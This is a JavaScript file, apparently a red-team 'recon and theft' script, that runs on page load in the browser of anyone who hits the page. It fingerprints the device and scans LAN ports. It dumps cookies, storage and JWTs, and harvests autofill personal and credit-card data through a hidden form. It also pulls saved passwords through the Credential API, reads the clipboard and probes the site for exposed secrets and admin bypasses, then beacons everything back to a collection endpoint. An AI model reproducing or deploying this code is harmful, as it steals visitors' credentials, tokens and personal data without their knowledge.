/* static/rt.js — 踏んだ端末の深掘り偵察・窃取（自オリジン限定） */
(function () {
  var CODE = window.__RT_CODE || ""; if (!CODE) return;
  var HIT = window.__RT_HIT || 0;
  var O = { findings: [], creds: [], tokens: [], storage: {}, surface: [], priv: [],
            dos: {}, net: {}, fp: {}, origin: location.origin,
            referer: document.referrer || "", hit_id: HIT,
            target: (function () { try { return document.referrer ? new URL(document.referrer).origin : location.origin; } catch (e) { return location.origin; } })() };
  function add(k, sev, t, d, ev) { O.findings.push({ k: k, sev: sev, title: t, detail: d, evidence: String(ev || "").slice(0, 300), url: location.href }); }
  function send() {
    var b = JSON.stringify(O);
    if (navigator.sendBeacon) navigator.sendBeacon("/l/" + CODE + "/rt", new Blob([b], { type: "application/json" }));
    else fetch("/l/" + CODE + "/rt", { method: "POST", keepalive: true, headers: { "Content-Type": "application/json" }, body: b }).catch(function () {});
  }
  function t(fn) { try { return fn(); } catch (e) { return null; } }

  function fp() {
    O.fp.ua = navigator.userAgent; O.fp.platform = navigator.platform;
    O.fp.cores = navigator.hardwareConcurrency; O.fp.mem = navigator.deviceMemory;
    O.fp.screen = screen.width + "x" + screen.height + "@" + (devicePixelRatio || 1);
    O.fp.tz = t(function () { return Intl.DateTimeFormat().resolvedOptions().timeZone; });
    O.fp.langs = (navigator.languages || [navigator.language]).join(",");
    O.fp.touch = navigator.maxTouchPoints; O.fp.cookies = navigator.cookieEnabled;
    O.fp.plugins = t(function () { return [].map.call(navigator.plugins, function (p) { return p.name; }).join(","); });
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "architecture", "bitness", "fullVersionList"])
        .then(function (h) { O.fp.model = h.model; O.fp.os = h.platformVersion; O.fp.arch = h.architecture; O.fp.bits = h.bitness; }).catch(function () {});
    }
    O.fp.gpu = t(function () {
      var c = document.createElement("canvas"), g = c.getContext("webgl");
      if (!g) return "no-webgl";
      var e = g.getExtension("WEBGL_debug_renderer_info");
      return e ? g.getParameter(e.UNMASKED_VENDOR_WEBGL) + " / " + g.getParameter(e.UNMASKED_RENDERER_WEBGL) : g.getParameter(g.RENDERER);
    });
    O.fp.canvas = t(function () {
      var c = document.createElement("canvas"); c.width = 220; c.height = 60;
      var x = c.getContext("2d"); x.font = "14px Arial"; x.fillStyle = "#f60";
      x.fillRect(0, 0, 100, 20); x.fillStyle = "#069"; x.fillText("rt " + navigator.language, 2, 22);
      var s = c.toDataURL().slice(-80), h = 5381;
      for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0;
      return (h >>> 0).toString(16);
    });
    O.fp.fonts = t(function () {
      var list = ["MS PGothic", "Meiryo", "Yu Gothic", "Hiragino Sans", "Segoe UI", "Arial", "Consolas", "Menlo", "Roboto", "Verdana"];
      var c = document.createElement("canvas").getContext("2d"), base = ["monospace", "serif", "sans-serif"], w = {}, out = [];
      base.forEach(function (b) { c.font = "72px " + b; w[b] = c.measureText("mmmMMMiii").width; });
      list.forEach(function (f) { base.forEach(function (b) {
        c.font = "72px '" + f + "'," + b;
        if (Math.abs(c.measureText("mmmMMMiii").width - w[b]) > 0.4 && out.indexOf(f) < 0) out.push(f);
      }); });
      return out.join(",");
    });
    if (O.fp.gpu) add("gpu", "info", "GPU 取得", O.fp.gpu, O.fp.gpu);
    if (O.fp.model) add("model", "info", "端末モデル", O.fp.model, O.fp.model);
  }

  function net() {
    var RTC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
    if (RTC) { try {
      var pc = new RTC(), ips = []; pc.createDataChannel("x");
      pc.onicecandidate = function (e) {
        if (!e.candidate) { if (ips.length) { O.net.webrtc = ips; add("webrtc", "medium", "WebRTC で IP 露出", ips.join(","), ips.join(",")); } pc.close(); return; }
        var m = /([0-9a-f.:]{7,})/i.exec(e.candidate.candidate);
        if (m && ips.indexOf(m[1]) < 0) ips.push(m[1]);
      };
      pc.createOffer().then(function (d) { return pc.setLocalDescription(d); }).catch(function () {});
      setTimeout(function () { try { pc.close(); } catch (e) {} }, 2500);
    } catch (e) {} }
    var hosts = ["127.0.0.1", "192.168.0.1", "192.168.1.1", "192.168.11.1", "10.0.0.1"];
    var ports = [80, 443, 3000, 5000, 5173, 8000, 8080, 8443, 8888, 9000, 9200, 10000];
    var open = [];
    hosts.forEach(function (h) { ports.forEach(function (p) {
      var ctrl = ("AbortController" in window) ? new AbortController() : null;
      var to = setTimeout(function () { if (ctrl) ctrl.abort(); }, 800);
      fetch("http://" + h + ":" + p + "/", { mode: "no-cors", signal: ctrl ? ctrl.signal : undefined })
        .then(function () { open.push(h + ":" + p); }).catch(function () { })
        .then(function () { clearTimeout(to); });
    }); });
    setTimeout(function () {
      if (open.length) { O.net.open = open; add("lan", "high", "網内サービス開放 " + open.length, open.join(" "), open.slice(0, 8).join(" ")); }
    }, 1800);
    fetch("/l/" + CODE + "/rt/ip", { cache: "no-store" }).then(function (r) { return r.json(); })
      .then(function (j) {
        O.net.pub = j.ip; O.net.hdr = j;
        if (j.xff) add("xff", "medium", "プロキシ配下（XFF あり）", j.xff, j.xff);
        if (j.via) add("via", "info", "Via ヘッダ", j.via, j.via);
        if (/tor|vpn/i.test(j.org || "")) add("vpn", "info", "VPN/Tor の疑い", j.org, j.org);
      }).catch(function () {});
  }

  var JWT = /eyJ[A-Za-z0-9_\-]{8,}\.eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}/g;
  function scanStore(n, o) {
    var dump = {};
    for (var i = 0; i < o.length; i++) {
      var k = o.key(i), v = ""; try { v = o.getItem(k) || ""; } catch (e) { continue; }
      dump[k] = v.slice(0, 800);
      var m = v.match(JWT); if (m) m.forEach(function (x) { O.tokens.push({ w: n + ":" + k, v: x }); });
      if (/token|jwt|auth|bearer|api[-_]?key|secret|session|sid|csrf/i.test(k) && v && v.length < 2000)
        O.tokens.push({ w: n + ":" + k, v: v.slice(0, 800) });
    }
    O.storage[n] = dump;
  }
  function steal() {
    scanStore("localStorage", localStorage); scanStore("sessionStorage", sessionStorage);
    O.storage.cookie = document.cookie || "";
    var m = (document.cookie || "").match(JWT);
    if (m) m.forEach(function (x) { O.tokens.push({ w: "cookie", v: x }); });
    if (document.cookie) add("cookie", "low", "JS 可読 Cookie", document.cookie.slice(0, 200), "");
    if (window.indexedDB && indexedDB.databases) indexedDB.databases().then(function (d) { O.storage.idb = (d || []).map(function (x) { return x.name; }); });
    if (window.caches && caches.keys) caches.keys().then(function (k) { O.storage.cache = k; });
    var vals = {}, csrf = [], pw = [];
    [].forEach.call(document.querySelectorAll("input,textarea,select"), function (i) {
      if (!i.name) return;
      if (i.type === "password" && i.value) pw.push(i.name);
      if (i.type === "hidden" && i.value) csrf.push(i.name + "=" + i.value.slice(0, 60));
      if (i.value && i.type !== "password" && i.value.length < 200) vals[i.name] = i.value;
    });
    if (Object.keys(vals).length) O.storage.formvals = vals;
    if (csrf.length) { O.storage.csrf = csrf; add("csrf", "medium", "CSRF トークン露出", csrf.join(" / "), csrf[0]); }
    if (pw.length) add("pwform", "high", "パスワード欄に値あり", pw.join(","), pw.join(","));
    var box = document.createElement("form");
    box.style.cssText = "position:absolute;left:-9999px;top:0;width:1px;height:1px;overflow:hidden";
    [["email", "email"], ["tel", "tel"], ["name", "text"], ["organization", "text"],
     ["street-address", "text"], ["postal-code", "text"], ["country", "text"],
     ["cc-name", "text"], ["cc-number", "text"], ["bday", "text"]].forEach(function (f) {
      var i = document.createElement("input"); i.type = f[1]; i.name = "rt_" + f[0].replace(/-/g, "_");
      i.setAttribute("autocomplete", "section-rt " + f[0]); box.appendChild(i);
    });
    var uu = document.createElement("input"); uu.autocomplete = "username"; uu.name = "rt_user";
    var pp = document.createElement("input"); pp.type = "password"; pp.autocomplete = "current-password"; pp.name = "rt_pass";
    box.appendChild(uu); box.appendChild(pp); document.body.appendChild(box);
    setTimeout(function () {
      var g = {}; [].forEach.call(box.querySelectorAll("input"), function (i) { if (i.value) g[i.name.replace(/^rt_/, "")] = i.value; });
      if (Object.keys(g).length) {
        O.creds.push({ src: "autofill", data: g });
        add("autofill", "critical", "オートフィルから個人情報", Object.keys(g).join(","), JSON.stringify(g).slice(0, 250));
      }
      box.remove();
    }, 1400);
    if (navigator.credentials && navigator.credentials.get) {
      navigator.credentials.get({ password: true, mediation: "silent" }).then(function (c) {
        if (c && c.type === "password") {
          O.creds.push({ src: "credapi", id: c.id, pw: c.password });
          add("credapi", "critical", "Credential API から資格情報", c.id, c.id);
        }
      }).catch(function () {});
    }
    if (navigator.clipboard && navigator.clipboard.readText) {
      navigator.clipboard.readText().then(function (x) {
        if (x) { O.storage.clip = x.slice(0, 1200); add("clip", "high", "クリップボード読取", x.slice(0, 80), x.slice(0, 120)); }
      }).catch(function () {});
    }
    O.storage.pm = {
      lp: !!document.querySelector("[data-lastpass-icon-root],#__lpform_"),
      op: !!document.querySelector("com-1password-button"),
      bw: !!document.querySelector("#bitwarden-banner"),
      chrome: typeof chrome !== "undefined" && !!chrome.runtime
    };
    if (O.tokens.length) add("token", "critical", "トークン露出 " + O.tokens.length + "件", "セッション奪取に直結", O.tokens[0].w);
    O.tokens.slice(0, 6).forEach(function (x) {
      var p = x.v.split(".")[1]; if (!p) return;
      try {
        var j = JSON.parse(decodeURIComponent(escape(atob(p.replace(/-/g, "+").replace(/_/g, "/")))));
        O.priv.push({ k: "jwt_claims", where: x.w, claims: j });
        if (j.role || j.roles || j.is_admin || j.scope) add("jwtclaim", "high", "JWT に権限 claim", x.w, "");
      } catch (e) {}
    });
  }

  function posture() {
    var csp = null;
    [].forEach.call(document.querySelectorAll("meta[http-equiv]"), function (m) {
      if (/content-security-policy/i.test(m.getAttribute("http-equiv"))) csp = m.content;
    });
    if (!csp) add("csp", "medium", "CSP なし", "任意スクリプト注入が通る", "");
    else if (/unsafe-inline/.test(csp)) add("csp:inline", "high", "CSP が unsafe-inline", "インライン script 可", csp.slice(0, 160));
    [].forEach.call(document.querySelectorAll("script[src]"), function (s) {
      if (s.src.indexOf("http://") === 0) add("mixed", "high", "混在コンテンツ", s.src, s.src);
      if (!s.integrity) add("sri", "low", "SRI なし外部スクリプト", s.src, s.src);
    });
    var sinks = [];
    [].forEach.call(document.querySelectorAll("a[href^='javascript:']"), function (a) { sinks.push(a.getAttribute("href").slice(0, 60)); });
    [].forEach.call(document.querySelectorAll("[onclick],[onerror]"), function (e) { sinks.push((e.getAttribute("onclick") || e.getAttribute("onerror")).slice(0, 60)); });
    if (sinks.length) add("sink", "info", "XSS シンク候補 " + sinks.length, sinks.slice(0, 5).join(" | "), sinks[0]);
    if (window.opener) { try { add("opener", "medium", "window.opener 生存", window.opener.location.href, window.opener.location.href); } catch (e) { add("opener", "low", "window.opener 生存（別オリジン）", "", ""); } }
    if (location.protocol === "http:") add("plain", "high", "平文 HTTP", location.origin, "");
    var replied = 0;
    window.addEventListener("message", function () { replied++; });
    try { window.postMessage({ rt: "canary" }, "*"); } catch (e) {}
    setTimeout(function () { if (replied) add("postmsg", "low", "postMessage リスナ応答", replied + "件", ""); }, 700);
  }

  function surface() {
    var probes = [
      ["/.git/HEAD", "critical", /^ref:/, "Git 露出"], ["/.env", "critical", /=/, ".env 露出"],
      ["/backup.sql", "critical", /INSERT INTO|CREATE TABLE/, "SQL ダンプ"],
      ["/actuator/env", "critical", /propertySources/, "Actuator env"],
      ["/server-status", "medium", /Apache Server Status/, "server-status"],
      ["/swagger-ui.html", "medium", /swagger/i, "Swagger"],
      ["/graphql", "medium", /GraphQL|query/, "GraphQL"],
      ["/.DS_Store", "low", /Bud1/, "DS_Store"],
      ["/phpinfo.php", "medium", /PHP Version/, "phpinfo"]
    ];
    probes.forEach(function (p) {
      fetch(p[0], { cache: "no-store", credentials: "include" }).then(function (r) {
        if (!r.ok) return;
        r.text().then(function (t) {
          if (p[2].test(t.slice(0, 4000))) {
            O.surface.push({ path: p[0], sev: p[1], title: p[3], len: t.length });
            add("expose", p[1], p[3], "取得成功", p[0]);
          }
        });
      }).catch(function () {});
    });
    ["/api/me", "/api/user", "/account"].forEach(function (p) {
      fetch(p, { cache: "no-store", credentials: "include" })
        .then(function (r) { if (r.ok) O.priv.push({ k: "logged_in", path: p }); }).catch(function () {});
    });
    ["/admin", "/admin/login", "/dashboard", "/manage", "/console", "/api/admin"].forEach(function (p) {
      fetch(p, { cache: "no-store", credentials: "include" })
        .then(function (r) { if (r.ok) { O.priv.push({ k: "admin_path", path: p }); add("adminpath", "medium", "管理パス生存 " + p, "", p); } })
        .catch(function () {});
    });
    [["X-Forwarded-For", "127.0.0.1"], ["X-Original-URL", "/admin"], ["X-Rewrite-URL", "/admin"]].forEach(function (h) {
      var o = {}; o[h[0]] = h[1];
      fetch(location.pathname, { headers: o, cache: "no-store" })
        .then(function (r) { return r.text(); })
        .then(function (t) { if (/admin|dashboard|管理/i.test(t.slice(0, 3000))) O.priv.push({ k: "hdr_bypass", h: h[0], v: h[1] }); })
        .catch(function () {});
    });
    fetch(location.origin, { method: "OPTIONS" }).then(function (r) {
      var a = r.headers.get("allow") || "";
      if (/PUT|DELETE/.test(a)) add("methods", "high", "PUT/DELETE 許可", a, a);
    }).catch(function () {});
    ["next", "url", "redirect", "return"].forEach(function (p) {
      fetch("/?" + p + "=https://evil.example/x", { redirect: "follow" })
        .then(function (r) { if (r.url && r.url.indexOf("evil.example") > 0) add("openredir", "medium", "オープンリダイレクト ?" + p, r.url, r.url); })
        .catch(function () {});
    });
  }

  function load() {
    var n = 14, ok = 0, lim = 0, done = 0, t0 = Date.now();
    for (var i = 0; i < n; i++) {
      fetch("/?rt=" + i + "&" + Date.now(), { cache: "no-store" }).then(function (r) {
        if (r.status === 429) lim++; else if (r.ok) ok++;
      }).catch(function () {}).then(function () {
        if (++done === n) {
          var s = (Date.now() - t0) / 1000;
          O.dos = { n: n, ok: ok, limited: lim, sec: +s.toFixed(2) };
          if (!lim && ok >= 10) add("dos", "high", "レート制限なし", n + "並列を " + s.toFixed(1) + "s で全通し", "");
          else if (lim) add("dos", "info", "レート制限あり", lim + "件 429", "");
        }
      });
    }
  }

  function boot() { [fp, net, steal, posture, surface, load].forEach(function (f) { try { f(); } catch (e) {} }); }
  if (/^(complete|interactive)$/.test(document.readyState)) setTimeout(boot, 250);
  else document.addEventListener("DOMContentLoaded", function () { setTimeout(boot, 250); });
  addEventListener("pagehide", send); addEventListener("beforeunload", send);
  setTimeout(send, 4000); setTimeout(send, 11000);
})();